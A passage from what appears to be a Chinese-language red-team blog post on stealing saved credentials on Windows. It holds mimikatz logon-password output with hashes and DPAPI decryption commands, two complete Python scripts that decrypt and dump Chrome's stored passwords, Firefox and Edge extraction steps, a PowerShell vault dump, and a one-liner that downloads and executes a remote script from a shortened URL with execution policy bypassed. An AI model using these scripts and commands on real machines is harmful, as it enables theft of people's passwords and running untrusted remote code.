class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">EeLrXMiD # sekurlsa::logonpasswords</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 229076 (00000000:00037ed4)</span><br><span class="line">Session           : Interactive from 1</span><br><span class="line">User Name         : ascotbe</span><br><span class="line">Domain            : 樱岛麻衣</span><br><span class="line">Logon Server      : 樱岛麻衣</span><br><span class="line">Logon Time        : 2021&#x2F;6&#x2F;7 9:37:53</span><br><span class="line">SID               : S-1-5-21-1645164750-2672341361-3879437546-1000</span><br><span class="line">        mSv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : ascotbe</span><br><span class="line">         * Domain   : 樱岛麻衣</span><br><span class="line">         * NTLM     : 31d6cfe0d16ae931b73c59d7e0c089c0</span><br><span class="line">         * SHA1     : da39a3ee5e6b4b0d3255bfef95601890afd80709</span><br><span class="line">        tsPkG :</span><br><span class="line">         * Username : ascotbe</span><br><span class="line">         * Domain   : (null)</span><br><span class="line">         * Password : (null)</span><br><span class="line">        wDiGeST :</span><br><span class="line">         * Username : ascotbe</span><br><span class="line">         * Domain   : (null)</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kErberoS :</span><br><span class="line">         * Username : ascotbe</span><br><span class="line">         * Domain   : (null)</span><br><span class="line">         * Password : (null)</span><br><span class="line">        sSp :</span><br><span class="line">        crEdMan :</span><br><span class="line">        clOuDAp :</span><br></pre></td></tr></table></figure><h2 id="浏览器密码"><a href="#浏览器密码" class="headerlink" title="浏览器密码"></a>浏览器密码</h2><h3 id="Chrome浏览器数据"><a href="#Chrome浏览器数据" class="headerlink" title="Chrome浏览器数据"></a>Chrome浏览器数据</h3><p>Chrome的配置文件存放在<code>%LocalAppData%</code>目录下。如果有两个Google Chrome账号那么每个账号会有不同的配置文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\admin\AppData\Local\Google\Chrome\User Data\Default （第一个配置文件的名称）</span><br><span class="line">C:\Users\admin\AppData\Local\Google\Chrome\User Data\Profile 2 （后续的配置文件以迭代数字方式命名）</span><br></pre></td></tr></table></figure><p>目录中的<code>Login Data</code>是SQLite 3数据库文件，里面存放了各种网站和账号等信息。</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/WindowsGrabPassword/8.png" alt="image-20210609143728350"></p><p>我们只需要关注logins这张表即可</p><ul><li>origin_url:登录网址</li><li>username_value:用户名</li><li>password_value:被加密的用户密码</li></ul><blockquote><p>chrome version 80（80.0.3987.163） 版本前</p></blockquote><p>chrome80以前的版本是直接可以通过DPAPI中的解密函数 CryptUnprotectData来进行解密的。</p><p>测试版本：<a href="https://dl.google.com/release2/chrome/XASj0J0BUKotBRR0eLPLxw_79.0.3945.88/79.0.3945.88_chrome_installer.exe">chrome 79.0.3945.88</a></p><h4 id="A用户解A的chrome密码"><a href="#A用户解A的chrome密码" class="headerlink" title="A用户解A的chrome密码"></a>A用户解A的chrome密码</h4><p>直接使用命令即可解密出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpapi::chrome &#x2F;in:&quot;C:\Users\ascotbe\AppData\Local\Google\Chrome\User Data\Default\Login Data&quot; &#x2F;unprotect</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/WindowsGrabPassword/9.png" alt="image-20210609154742793"></p><p>也可以直接使用脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span>  shutil</span><br><span class="line"><span class="keyword">import</span>  sqlite3</span><br><span class="line"><span class="comment">#pip install pywin32</span></span><br><span class="line"><span class="keyword">import</span>  win32crypt</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">APP_DATA_PATH= os.environ[<span class="string">&#x27;LOCALAPPDATA&#x27;</span>]</span><br><span class="line">DB_PATH = <span class="string">r&#x27;Google\Chrome\User Data\Default\Login Data&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ChromePassword</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.passwordList = []</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_chrome_db</span>(<span class="params">self</span>):</span></span><br><span class="line">        _full_path = os.path.join(APP_DATA_PATH,DB_PATH)</span><br><span class="line">        _temp_path = os.path.join(APP_DATA_PATH,<span class="string">&#x27;sqlite_file&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(_temp_path):</span><br><span class="line">            os.remove(_temp_path)</span><br><span class="line">        shutil.copyfile(_full_path,_temp_path)</span><br><span class="line">        self.show_password(_temp_path)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">show_password</span>(<span class="params">self,db_file</span>):</span></span><br><span class="line">        conn = sqlite3.connect(db_file)</span><br><span class="line">        _sql = <span class="string">&#x27;select signon_realm,username_value,password_value from logins&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> conn.execute(_sql):</span><br><span class="line">            ret = win32crypt.CryptUnprotectData(row[<span class="number">2</span>],<span class="literal">None</span>,<span class="literal">None</span>,<span class="literal">None</span>,<span class="number">0</span>)</span><br><span class="line">            <span class="comment">#密码解析后得到字节码，需要进行解码操作</span></span><br><span class="line">            _info = <span class="string">&#x27;url:%-40s username:%-20s password:%s\n&#x27;</span> %\</span><br><span class="line">                    (row[<span class="number">0</span>][:<span class="number">50</span>],row[<span class="number">1</span>],ret[<span class="number">1</span>].decode())</span><br><span class="line">            self.passwordList.append(_info)</span><br><span class="line">        conn.close()</span><br><span class="line">        os.remove(db_file)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">save_passwords</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;password.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.writelines(self.passwordList)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    Main = ChromePassword()</span><br><span class="line">    Main.get_chrome_db()</span><br><span class="line">    Main.save_passwords()</span><br></pre></td></tr></table></figure><h4 id="B用户解A的chrome密码"><a href="#B用户解A的chrome密码" class="headerlink" title="B用户解A的chrome密码"></a>B用户解A的chrome密码</h4><p>首先我们需要获取到A用户的MasterKey值，就可以解密了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpapi::chrome &#x2F;in:&quot;C:\Users\ascotbe\Desktop\Login Data&quot; &#x2F;unprotect &#x2F;masterkey:831d02bf734632f7aaa7719f5ec593111997c9aeefabe71ac4e4a963de546784662fcec40722a4656870698cff96c348a37d669131e99401e0947fa355e8fd0b</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/WindowsGrabPassword/10.png" alt="image-20210609161248445"></p><blockquote><p>chrome version 80 （80.0.3987.163）版本后</p></blockquote><p>利用主密钥使用AES-GCM加密算法加密密码存放Login Data数据库，然后用DPAPI的加密函数CryptProtectData加密主密钥存放在Local State文件。其中Local State文件存放在如下地址（假设windows用户为admin），本质是个json文件，其中一个值os_crypt下的encrypted_key是解密需要用的被加密后的密钥。</p><p>解密流程</p><ol><li>获取local state和Login Data文件位置</li><li>获取local state中加密的key(base64编码)</li><li>数据库语句提取Login Data sqllite文件的password_value</li><li>DPAPI解密加密key</li><li>ase-gcm解密password_value</li></ol><p>脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span>  shutil</span><br><span class="line"><span class="keyword">import</span>  sqlite3</span><br><span class="line"><span class="keyword">import</span>  win32crypt</span><br><span class="line"><span class="keyword">import</span> json,base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.backends <span class="keyword">import</span> default_backend</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.ciphers <span class="keyword">import</span> (</span><br><span class="line">    Cipher, algorithms, modes</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">APP_DATA_PATH= os.environ[<span class="string">&#x27;LOCALAPPDATA&#x27;</span>]</span><br><span class="line">DB_PATH = <span class="string">r&#x27;Google\Chrome\User Data\Default\Login Data&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">NONCE_BYTE_SIZE = <span class="number">12</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">cipher, plaintext, nonce</span>):</span></span><br><span class="line">    cipher.mode = modes.GCM(nonce)</span><br><span class="line">    encryptor = cipher.encryptor()</span><br><span class="line">    ciphertext = encryptor.update(plaintext)</span><br><span class="line">    <span class="keyword">return</span> (cipher, ciphertext, nonce)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">cipher, ciphertext, nonce</span>):</span></span><br><span class="line">    cipher.mode = modes.GCM(nonce)</span><br><span class="line">    decryptor = cipher.decryptor()</span><br><span class="line">    <span class="keyword">return</span> decryptor.update(ciphertext)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_cipher</span>(<span class="params">key</span>):</span></span><br><span class="line">    cipher = Cipher(</span><br><span class="line">        algorithms.AES(key),</span><br><span class="line">        <span class="literal">None</span>,</span><br><span class="line">        backend=default_backend()</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dpapi_decrypt</span>(<span class="params">encrypted</span>):</span></span><br><span class="line">    <span class="keyword">import</span> ctypes</span><br><span class="line">    <span class="keyword">import</span> ctypes.wintypes</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DATA_BLOB</span>(<span class="params">ctypes.Structure</span>):</span></span><br><span class="line">        _fields_ = [(<span class="string">&#x27;cbData&#x27;</span>, ctypes.wintypes.DWORD),</span><br><span class="line">                    (<span class="string">&#x27;pbData&#x27;</span>, ctypes.POINTER(ctypes.c_char))]</span><br><span class="line"></span><br><span class="line">    p = ctypes.create_string_buffer(encrypted, <span class="built_in">len</span>(encrypted))</span><br><span class="line">    blobin = DATA_BLOB(ctypes.sizeof(p), p)</span><br><span class="line">    blobout = DATA_BLOB()</span><br><span class="line">    retval = ctypes.windll.crypt32.CryptUnprotectData(</span><br><span class="line">        ctypes.byref(blobin), <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="number">0</span>, ctypes.byref(blobout))</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> retval:</span><br><span class="line">        <span class="keyword">raise</span> ctypes.WinError()</span><br><span class="line">    result = ctypes.string_at(blobout.pbData, blobout.cbData)</span><br><span class="line">    ctypes.windll.kernel32.LocalFree(blobout.pbData)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unix_decrypt</span>(<span class="params">encrypted</span>):</span></span><br><span class="line">    <span class="keyword">if</span> sys.platform.startswith(<span class="string">&#x27;linux&#x27;</span>):</span><br><span class="line">        password = <span class="string">&#x27;peanuts&#x27;</span></span><br><span class="line">        iterations = <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> NotImplementedError</span><br><span class="line"></span><br><span class="line">    <span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line">    <span class="keyword">from</span> Crypto.Protocol.KDF <span class="keyword">import</span> PBKDF2</span><br><span class="line"></span><br><span class="line">    salt = <span class="string">&#x27;saltysalt&#x27;</span></span><br><span class="line">    iv = <span class="string">&#x27; &#x27;</span> * <span class="number">16</span></span><br><span class="line">    length = <span class="number">16</span></span><br><span class="line">    key = PBKDF2(password, salt, length, iterations)</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, IV=iv)</span><br><span class="line">    decrypted = cipher.decrypt(encrypted[<span class="number">3</span>:])</span><br><span class="line">    <span class="keyword">return</span> decrypted[:-<span class="built_in">ord</span>(decrypted[-<span class="number">1</span>])]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_key_from_local_state</span>():</span></span><br><span class="line">    jsn = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(os.path.join(os.environ[<span class="string">&#x27;LOCALAPPDATA&#x27;</span>],</span><br><span class="line">        <span class="string">r&quot;Google\Chrome\User Data\Local State&quot;</span>),encoding=<span class="string">&#x27;utf-8&#x27;</span>,mode =<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        jsn = json.loads(<span class="built_in">str</span>(f.readline()))</span><br><span class="line">    <span class="keyword">return</span> jsn[<span class="string">&quot;os_crypt&quot;</span>][<span class="string">&quot;encrypted_key&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">aes_decrypt</span>(<span class="params">encrypted_txt</span>):</span></span><br><span class="line">    encoded_key = get_key_from_local_state()</span><br><span class="line">    encrypted_key = base64.b64decode(encoded_key.encode())</span><br><span class="line">    encrypted_key = encrypted_key[<span class="number">5</span>:]</span><br><span class="line">    key = dpapi_decrypt(encrypted_key)</span><br><span class="line">    nonce = encrypted_txt[<span class="number">3</span>:<span class="number">15</span>]</span><br><span class="line">    cipher = get_cipher(key)</span><br><span class="line">    <span class="keyword">return</span> decrypt(cipher,encrypted_txt[<span class="number">15</span>:],nonce)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ChromePassword</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.passwordList = []</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_chrome_db</span>(<span class="params">self</span>):</span></span><br><span class="line">        _full_path = os.path.join(APP_DATA_PATH,DB_PATH)</span><br><span class="line">        _temp_path = os.path.join(APP_DATA_PATH,<span class="string">&#x27;sqlite_file&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(_temp_path):</span><br><span class="line">            os.remove(_temp_path)</span><br><span class="line">        shutil.copyfile(_full_path,_temp_path)</span><br><span class="line">        self.show_password(_temp_path)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">show_password</span>(<span class="params">self,db_file</span>):</span></span><br><span class="line">        conn = sqlite3.connect(db_file)</span><br><span class="line">        _sql = <span class="string">&#x27;select signon_realm,username_value,password_value from logins&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> conn.execute(_sql):</span><br><span class="line">            <span class="comment"># print(type(row[2]))</span></span><br><span class="line">            host = row[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">if</span> host.startswith(<span class="string">&#x27;android&#x27;</span>):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            name = row[<span class="number">1</span>]</span><br><span class="line">            value = self.chrome_decrypt(row[<span class="number">2</span>])<span class="comment">######加密方式改變后的重點位置</span></span><br><span class="line">            <span class="comment">#密码解析后得到字节码，需要进行解码操作</span></span><br><span class="line">            _info = <span class="string">&#x27;url:%-40s username:%-20s password:%s\n&#x27;</span> %(host,name,value)</span><br><span class="line">            self.passwordList.append(_info)</span><br><span class="line">        conn.close()</span><br><span class="line">        os.remove(db_file)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">chrome_decrypt</span>(<span class="params">self,encrypted_txt</span>):</span></span><br><span class="line">        <span class="keyword">if</span> sys.platform == <span class="string">&#x27;win32&#x27;</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">if</span> encrypted_txt[:<span class="number">4</span>] == <span class="string">b&#x27;\x01\x00\x00\x00&#x27;</span>:</span><br><span class="line">                    decrypted_txt = dpapi_decrypt(encrypted_txt)</span><br><span class="line">                    <span class="keyword">return</span> decrypted_txt.decode()</span><br><span class="line">                <span class="keyword">elif</span> encrypted_txt[:<span class="number">3</span>] == <span class="string">b&#x27;v10&#x27;</span>:</span><br><span class="line">                    decrypted_txt = aes_decrypt(encrypted_txt)</span><br><span class="line">                    <span class="keyword">return</span> decrypted_txt[:-<span class="number">16</span>].decode()</span><br><span class="line">            <span class="keyword">except</span> WindowsError:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">return</span> unix_decrypt(encrypted_txt)</span><br><span class="line">            <span class="keyword">except</span> NotImplementedError:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">save_passwords</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;password.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.writelines(self.passwordList)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    Main = ChromePassword()</span><br><span class="line">    Main.get_chrome_db()</span><br><span class="line">    Main.save_passwords()</span><br></pre></td></tr></table></figure><h3 id="Firefox浏览器数据"><a href="#Firefox浏览器数据" class="headerlink" title="Firefox浏览器数据"></a>Firefox浏览器数据</h3><p>所有的密码保存位置在<code>%APPDATA%\Mozilla\Firefox\Profiles\xxxxxxxx.default\</code>(xxxxxxxx为8位随机字母和数字的组合)</p><p>不同版本的Firefox保存记录的文件名称不同，具体区别如下：</p><ul><li><p>Version大于等于32.0，保存记录的文件为logins.json</p></li><li><p>Version大于等于3.5，小于32.0，保存记录的文件为signons.sqlite</p></li></ul><p>不同版本的Firefox密钥文件的位置不同，具体区别如下：</p><ul><li><p>Version小于58.0.2，密钥文件为key3.db</p></li><li><p>Version大于等于58.0.2，密钥文件为key4.db</p></li></ul><p>默认情况下，当前用户的权限可以查看Firefox浏览器中保存的所有密码，为了提高安全性，Firefox浏览器支持为保存的密码添加额外的保护：设置Master Password。</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/WindowsGrabPassword/11.png" alt="image-20210609191949114"></p><p>添加Master Password后，查看保存的密码需要额外输入Master Password。</p><p>解密流程：</p><ul><li><p>读取密钥文件(key4.db或key3.db)，获得key和iv</p></li><li><p>读取记录文件(logins.json或signons.sqlite)的内容</p></li><li><p> 如果未设置Master Password，使用key和iv对记录文件中的加密内容进行3DES-CBC解密。如果设置Master Password，还需要获得明文形式的Master Password，才能进行解密</p></li></ul><blockquote><p>未设置Master Password解密</p></blockquote><p>WebBrowserPassView：<a href="https://www.nirsoft.net/password_recovery_tools.html">官方下载</a> <a href="https://github.com/Ascotbe/Random-img/blob/master/WindowsGrabPassword/WebBrowserPassView.exe">备份下载</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\WebBrowserPassView.exe &#x2F;LoadPasswordsFirefox 1 &#x2F;shtml &quot;C:\Users\ascotbe\Desktop\passwords.html&quot;</span><br></pre></td></tr></table></figure><p>还能把谷歌最新版本的秘钥给解密了</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/WindowsGrabPassword/12.png" alt="image-20210609192420620"></p><blockquote><p>设置Master Password解密</p></blockquote><p>firefox_decrypt：<a href="https://github.com/unode/firefox_decrypt/releases/tag/0.7.0">官方下载</a></p><p>解密需要获取到用户设置的Master Password才行，解密工具别使用1.0版本，问题很多</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/WindowsGrabPassword/13.png" alt="image-20210609194828114"></p><h3 id="IE-浏览器数据"><a href="#IE-浏览器数据" class="headerlink" title="IE 浏览器数据"></a>IE 浏览器数据</h3><p>首先需要打开浏览器的记住密码功能：工具-&gt;Internet 选项-&gt;内容-&gt;自动完成-&gt;勾选表单上的用户名和密码</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/WindowsGrabPassword/14.png" alt="image-20210610095248052"></p><blockquote><p>远程下载执行（需要开启PS可执行）</p></blockquote><p>直接使用命令，目前GitHub国内无法访问，推荐使用自己服务器存放脚本或者使用第三方源</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;bit.ly&#x2F;2K75g15&#39;)&quot;</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/WindowsGrabPassword/15.png" alt="image-20210610100850268"></p><blockquote><p>本地执行（需要开启PS可执行）</p></blockquote><p>直接把PS1文件放到目标机器上，执行就好了</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[<span class="built_in">void</span>][<span class="type">Windows.Security.Credentials.PasswordVault</span>,<span class="type">Windows.Security.Credentials</span>,<span class="type">ContentType</span>=<span class="type">WindowsRuntime</span>]</span><br><span class="line"><span class="variable">$vault</span> = <span class="built_in">New-Object</span> Windows.Security.Credentials.PasswordVault</span><br><span class="line"><span class="variable">$vault</span>.RetrieveAll() | % &#123; <span class="variable">$_</span>.RetrievePassword();<span class="variable">$_</span> &#125; | <span class="built_in">select</span> username,resource,password</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/WindowsGrabPassword/16.png" alt="image-20210610101513741"></p><blockquote><p>落地文件执行</p></blockquote><p>IE PassView：<a href="https://www.nirsoft.net/utils/internet_explorer_password.html">官方下载</a>  <a href="https://github.com/Ascotbe/Random-img/blob/master/WindowsGrabPassword/ViewPass.exe">备份下载</a></p><p>直接把文件双击即可看到密码</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/WindowsGrabPassword/17.png" alt="image-20210610105509664"></p><h3 id="Edge浏览器数据"><a href="#Edge浏览器数据" class="headerlink" title="Edge浏览器数据"></a>Edge浏览器数据</h3><p>由于微软就套了一层壳，加密方式完全没有修改，值修改了数据保存的路径，所以我们修改上面Chrome的脚本即可获取成功</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#数据库路径</span><br><span class="line">C:\Users\ascotbe\AppData\Local\Microsoft\Edge\User Data\Default\Login Data</span><br><span class="line">#秘钥路径</span><br><span class="line">C:\Users\ascotbe\AppData\Local\Microsoft\Edge\User Data\Local State</span><br></pre></td></tr></table></figure><p>脚本修改如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span 